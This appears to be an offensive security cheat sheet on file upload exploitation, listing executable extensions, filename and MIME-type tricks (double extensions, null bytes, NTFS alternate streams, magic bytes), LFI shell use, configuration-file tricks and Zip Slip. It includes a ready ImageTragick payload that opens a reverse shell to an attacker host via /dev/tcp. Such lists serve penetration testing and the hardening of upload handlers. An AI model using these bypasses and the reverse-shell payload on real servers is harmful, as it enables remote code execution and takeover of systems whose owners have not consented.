# Upload

Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.

## Summary

* [Tools](#tools)
* [Exploits](#exploits)
    * [PHP Extension](#php-extension)
    * [Other extensions](#other-extensions)
    * [Upload tricks](#upload-tricks)
    * [Picture upload with LFI](#picture-upload-with-lfi)
    * [Configuration Files](#configuration-files)
    * [CVE - Image Tragik](#cve---image-tragik)
    * [ZIP Archive](#zip-archive)
* [References](#references)


## Tools
- [Fuxploider](https://github.com/almandin/fuxploider)
- [Burp> Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)

## Exploits

### PHP Extension

* Default PHP extensions
    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7
    ```
* Less known extensions
    ```powershell
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```
* Double extensions
    ```powershell
    .jpeg.php
    .jpg.php
    .png.php
    .*.php
    ```

### Other extensions

* asp : `.asp, .aspx, .cer and .asa (IIS <= 7.5), shell.aspx;1.jpg (IIS < 7.0)`
* perl: `.pl, .pm, .cgi, .lib`
* jsp : `.jsp, .jspx, .jsw, .jsv, .jspf`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`

### Upload tricks

- Use double extensions : `.jpg.php`
- Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
- Mix uppercase and lowercase : `.pHp, .pHP5, .PhAr`

- Null byte (works well against `pathinfo()`)
    * .php%00.gif
    * .php\x00.gif
    * .php%00.png
    * .php\x00.png
    * .php%00.jpg
    * .php\x00.jpg
- Special characters
    * file.php...... (In Windows when a file is created with dots at the end those will be removed)
    * file.php%20
- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
    * `Content-Type : image/gif`
    * `Content-Type : image/png`
    * `Content-Type : image/jpeg`
- [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
    * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
- Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "file.asax:.jpg"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "file.asp::$data.")

### Picture upload with LFI

Valid pictures hosting PHP code. Upload the picture and use a local file inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

- Picture Metadata, hide the payload inside a comment tag in the metadata.
- Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.

### Configuration Files

If you are trying to upload files to a PHP server, take a look at the .htaccess trick to execute code.
If you are  trying to upload files to an ASP server, take a look at the .config trick to execute code.

Configuration files examples
- .htaccess
- web.config
- httpd.conf
- \_\_init\_\_.py


### CVE - Image Tragik

Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)

```powershell
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

More payload in the folder `Picture Image Magik`

### ZIP archive

When a ZIP/archive file is automatically decompressed after the upload

* Zip Slip: directory traversal to write a file somewhere else

## References

* Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil
* [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
* [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [File Upload restrictions bypass - Haboob Team](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
